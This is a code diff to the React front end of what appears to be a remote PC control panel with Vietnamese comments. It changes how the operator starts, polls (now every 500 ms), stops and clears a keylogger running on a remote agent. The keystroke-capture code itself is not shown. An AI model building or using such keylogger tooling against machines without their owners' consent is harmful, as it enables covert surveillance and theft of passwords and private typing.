@@ -38,9 +38,6 @@ function App() {
   const [keyloggerRunning, setKeyloggerRunning] = useState(false);
   const [keyloggerContent, setKeyloggerContent] = useState('');
   const [keyloggerBusy, setKeyloggerBusy] = useState(false);
-  const [keyloggerLastLength, setKeyloggerLastLength] = useState(0);
-  /** Khi true: không cập nhật lại nội dung từ poll (sau Clear view); Refresh dùng force để bỏ cờ và tải lại. */
-  const [keyloggerViewCleared, setKeyloggerViewCleared] = useState(false);
   const [webcamOpen, setWebcamOpen] = useState(false);
   const webcamBusy = false;
   const [mouseControlOpen, setMouseControlOpen] = useState(false);
@@ -100,10 +97,8 @@ function App() {
 
   const resolvePc = useCallback((pc: RemotePc) => pcs.find((p) => p.id === pc.id) ?? pc, [pcs]);
 
-  const refreshKeyloggerLog = useCallback(
-    async (options?: { force?: boolean }) => {
+  const refreshKeyloggerLog = useCallback(async () => {
       if (!selectedPc) return;
-      if (keyloggerViewCleared && !options?.force) return;
 
       try {
         const result = await window.remoteApi.runCommand(selectedPc.id, 'KEYLOGGER_GET_LOG');
@@ -122,22 +117,17 @@ function App() {
         if (parsed.ok === false && parsed.message) {
           appendLog(`KEYLOGGER_GET_LOG: ${parsed.message}`);
         }
-        if (options?.force) {
-          setKeyloggerViewCleared(false);
-        }
       } catch {
         appendLog('KEYLOGGER_GET_LOG: không đọc được phản hồi agent');
       }
-    },
-    [selectedPc, appendLog, keyloggerViewCleared],
-  );
+    }, [selectedPc, appendLog]);
 
   useEffect(() => {
     if (!keyloggerOpen) return;
     void refreshKeyloggerLog();
     const timer = setInterval(() => {
       void refreshKeyloggerLog();
-    }, 1000);
+    }, 500);
     return () => clearInterval(timer);
   }, [keyloggerOpen, refreshKeyloggerLog]);
 
@@ -261,9 +251,8 @@ function App() {
       appendLog('No PC selected.');
       return;
     }
-    setKeyloggerViewCleared(false);
     setKeyloggerOpen(true);
-    await refreshKeyloggerLog({ force: true });
+    await refreshKeyloggerLog();
   };
 
   const handleStartKeylogger = async () => {
@@ -275,9 +264,8 @@ function App() {
       if (parsed.ok) {
         setKeyloggerRunning(true);
         setKeyloggerContent('');
-        setKeyloggerViewCleared(false);
         appendLog(`KEYLOGGER_START: ${parsed.message ?? 'ok'}`);
-        await refreshKeyloggerLog({ force: true });
+        await refreshKeyloggerLog();
       } else {
         appendLog(`KEYLOGGER_START failed: ${parsed.message ?? result.message}`);
       }
@@ -301,7 +289,6 @@ function App() {
       if (parsed.ok && typeof parsed.output === 'string') {
         setKeyloggerContent(parsed.output);
         setKeyloggerRunning(false);
-        setKeyloggerViewCleared(false);
         appendLog(`KEYLOGGER_STOP: đã nhận log (${parsed.output.length} ký tự)`);
       } else {
         setKeyloggerRunning(false);
@@ -310,6 +297,26 @@ function App() {
     } catch {
       appendLog('KEYLOGGER_STOP: lỗi phân tích phản hồi');
       setKeyloggerRunning(false);
+    } finally {
+      setKeyloggerBusy(false);
+    }
+  };
+
+  const handleClearKeyloggerLog = async () => {
+    if (!selectedPc) return;
+    setKeyloggerBusy(true);
+    try {
+      const result = await window.remoteApi.runAgentLine(selectedPc.id, 'KEYLOGGER_CLEAR_LOG');
+      const parsed = JSON.parse(result.raw) as { ok?: boolean; message?: string };
+      if (parsed.ok) {
+        setKeyloggerContent('');
+        appendLog(`KEYLOGGER_CLEAR_LOG: ${parsed.message ?? 'cleared'}`);
+        await refreshKeyloggerLog();
+      } else {
+        appendLog(`KEYLOGGER_CLEAR_LOG: ${parsed.message ?? result.message}`);
+      }
+    } catch {
+      appendLog('KEYLOGGER_CLEAR_LOG: lỗi phân tích phản hồi');
     } finally {
       setKeyloggerBusy(false);
     }
@@ -554,31 +561,17 @@ function App() {
               busy={keyloggerBusy}
               content={keyloggerContent}
               targetOs={selectedPc?.os ?? 'Windows'}
-              onClose={async () => {
-                  if (selectedPc && keyloggerRunning) {
-                      try {
-                          await window.remoteApi.runCommand(selectedPc.id, 'KEYLOGGER_STOP');
-                      } catch {
-                          // ignore
-                      }
-                  }
-
+              onClose={() => {
                   setKeyloggerRunning(false);
                   setKeyloggerContent('');
-                  setKeyloggerLastLength(0);
-                  setKeyloggerViewCleared(false);
                   setKeyloggerOpen(false);
+                  void handleStopKeylogger();
               }}
-              onClearLog={() => {
-                  setKeyloggerViewCleared(true);
-                  setKeyloggerContent('');
-                  setKeyloggerLastLength(0);
-              }}
-              onResumeView={() => void refreshKeyloggerLog({ force: true })}
+              onClearLog={() => void handleClearKeyloggerLog()}
               onStart={() => void handleStartKeylogger()}
+              onStop={() => void handleStopKeylogger()}
               open={keyloggerOpen}
               running={keyloggerRunning}
-              viewCleared={keyloggerViewCleared}
               targetLabel={
                   selectedPc ? `${selectedPc.name} (${selectedPc.host}:${selectedPc.port})` : 'No target'
               }
